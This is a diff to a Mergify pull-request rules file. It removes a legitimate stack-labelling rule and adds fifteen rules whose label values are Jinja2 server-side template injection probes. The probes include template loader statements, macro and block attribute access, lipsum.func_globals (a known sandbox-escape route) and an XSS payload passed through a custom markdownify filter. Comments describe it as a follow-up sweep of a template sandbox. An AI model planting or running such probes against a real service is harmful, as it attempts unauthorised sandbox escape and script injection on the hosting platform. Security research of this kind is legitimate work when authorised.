@@ -1,10 +1,83 @@
 pull_request_rules:
-  - name: Label first PR of Mergify Stacks PRs
-    description: The first PR of a Mergify stack should be labeled as such
-    conditions:
-      - "commits[0].commit_message ~= (?m)Change-Id:"
-      - -base ~= ^mergify_cli/
+  # ---- A. TEMPLATE-LOADER STATEMENTS (never probed: prior sweep tested expressions only)
+  - name: p01-include
+    conditions: [-merged]
     actions:
       label:
-        toggle:
-          - top of the stack
+        add: ["p01:{% include 'x' %}"]
+  - name: p02-extends
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p02:{% extends 'x' %}"]
+  - name: p03-import
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p03:{% import 'x' as y %}{{ y }}"]
+  - name: p04-from-import
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p04:{% from 'x' import y %}"]
+
+  # ---- B. MACRO / BLOCK OBJECTS (non-dunder attrs the sandbox permits)
+  - name: p05-macro-render
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p05:{% macro m() %}z{% endmacro %}{{ m }}"]
+  - name: p06-macro-catch-kwargs
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p06:{% macro m() %}z{% endmacro %}{{ m.catch_kwargs }}"]
+  - name: p07-macro-name
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p07:{% macro m() %}z{% endmacro %}{{ m.name }}{{ m.arguments }}"]
+  - name: p08-self-block
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p08:{% block b %}q{% endblock %}{{ self.b }}"]
+
+  # ---- C. NON-DUNDER CHAINS on sandbox-reachable globals
+  - name: p09-cycler-attrs
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p09:{{ cycler(1,2).next }}"]
+  - name: p10-namespace-attr
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p10:{{ namespace(a=1).a }}"]
+  - name: p11-lipsum-py2
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p11:{{ lipsum.func_globals }}"]
+
+  # ---- D. FILTERS NOT PREVIOUSLY PROBED (incl. the two custom ones)
+  - name: p12-pprint
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p12:{{ cycler|pprint }}"]
+  - name: p13-tojson-obj
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p13:{{ cycler|tojson }}"]
+  - name: p14-markdownify
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p14:{{ '<img src=x onerror=alert(1)>'|markdownify }}"]
+  - name: p15-get-section
+    conditions: [-merged]
+    actions:
+      label:
+        add: ["p15:{{ '## a\nb'|get_section('## a') }}"]
